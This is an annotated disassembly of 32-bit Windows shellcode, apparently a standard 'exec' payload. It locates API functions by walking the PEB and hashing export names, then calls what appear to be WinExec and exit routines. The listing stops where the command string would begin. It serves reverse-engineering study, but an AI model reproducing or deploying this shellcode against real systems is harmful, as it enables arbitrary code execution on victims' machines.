0x00000000   1           fc  cld					; make so str ptr is inc
0x00000001   5   e882000000  call 0x88
0x00000006   1           60  pushal
0x00000007   2         89e5  mov ebp, esp
0x00000009   2         31c0  xor eax, eax				; zero-out
0x0000000b   4     648b5030  mov edx, dword fs:[eax + 0x30]		; address of PEB
0x0000000f   3       8b520c  mov edx, dword [edx + 0xc]			; address of LoaderData
0x00000012   3       8b5214  mov edx, dword [edx + 0x14]		; esi takes addr of 
0x00000015   3       8b7228  mov esi, dword [edx + 0x28]		; 
0x00000018   4     0fb74a26  movzx ecx, word [edx + 0x26]		; 
0x0000001c   2         31ff  xor edi, edi
0x0000001e   1           ac  lodsb al, byte [esi]
0x0000001f   2         3c61  cmp al, 0x61
0x00000021   2         7c02  jl 0x25
0x00000023   2         2c20  sub al, 0x20
0x00000025   3       c1cf0d  ror edi, 0xd
0x00000028   2         01c7  add edi, eax
0x0000002a   2         e2f2  loop 0x1e
0x0000002c   1           52  push edx
0x0000002d   1           57  push edi
0x0000002e   3       8b5210  mov edx, dword [edx + 0x10]		; 
0x00000031   3       8b4a3c  mov ecx, dword [edx + 0x3c]
0x00000034   4     8b4c1178  mov ecx, dword [ecx + edx + 0x78]
0x00000038   2         e348  jecxz 0x82
0x0000003a   2         01d1  add ecx, edx
0x0000003c   1           51  push ecx
0x0000003d   3       8b5920  mov ebx, dword [ecx + 0x20]
0x00000040   2         01d3  add ebx, edx
0x00000042   3       8b4918  mov ecx, dword [ecx + 0x18]
0x00000045   2         e33a  jecxz 0x81
0x00000047   1           49  dec ecx
0x00000048   3       8b348b  mov esi, dword [ebx + ecx*4]
0x0000004b   2         01d6  add esi, edx
0x0000004d   2         31ff  xor edi, edi
0x0000004f   1           ac  lodsb al, byte [esi]
0x00000050   3       c1cf0d  ror edi, 0xd
0x00000053   2         01c7  add edi, eax
0x00000055   2         38e0  cmp al, ah
0x00000057   2         75f6  jne 0x4f
0x00000059   3       037df8  add edi, dword [ebp - 8]
0x0000005c   3       3b7d24  cmp edi, dword [ebp + 0x24]
0x0000005f   2         75e4  jne 0x45
0x00000061   1           58  pop eax
0x00000062   3       8b5824  mov ebx, dword [eax + 0x24]
0x00000065   2         01d3  add ebx, edx
0x00000067   4     668b0c4b  mov cx, word [ebx + ecx*2]
0x0000006b   3       8b581c  mov ebx, dword [eax + 0x1c]
0x0000006e   2         01d3  add ebx, edx
0x00000070   3       8b048b  mov eax, dword [ebx + ecx*4]
0x00000073   2         01d0  add eax, edx
0x00000075   4     89442424  mov dword [esp + 0x24], eax
0x00000079   1           5b  pop ebx
0x0000007a   1           5b  pop ebx
0x0000007b   1           61  popal
0x0000007c   1           59  pop ecx
0x0000007d   1           5a  pop edx
0x0000007e   1           51  push ecx
0x0000007f   2         ffe0  jmp eax
0x00000081   1           5f  pop edi
0x00000082   1           5f  pop edi
0x00000083   1           5a  pop edx
0x00000084   2         8b12  mov edx, dword [edx]
0x00000086   2         eb8d  jmp 0x15
0x00000088   1           5d  pop ebp
0x00000089   2         6a01  push 1
0x0000008b   6   85b2000000  lea eax, dword [ebp + 0xb2]
0x00000091   1           50  push eax
0x00000092   5   68318b6f87  push 0x876f8b31
0x00000097   2         ffd5  call ebp
0x00000099   5   bbe01d2a0a  mov ebx, 0xa2a1de0
0x0000009e   5   68a695bd9d  push 0x9dbd95a6
0x000000a3   2         ffd5  call ebp
0x000000a5   2         3c06  cmp al, 6
0x000000a7   2         7c0a  jl 0xb3
0x000000a9   3       80fbe0  cmp bl, 0xe0
0x000000ac   2         7505  jne 0xb3
0x000000ae   5   bb4713726f  mov ebx, 0x6f721347
0x000000b3   2         6a00  push 0
0x000000b5   1           53  push ebx
0x000000b6   2         ffd5  call ebp
0x000000b8   1           0a  invalid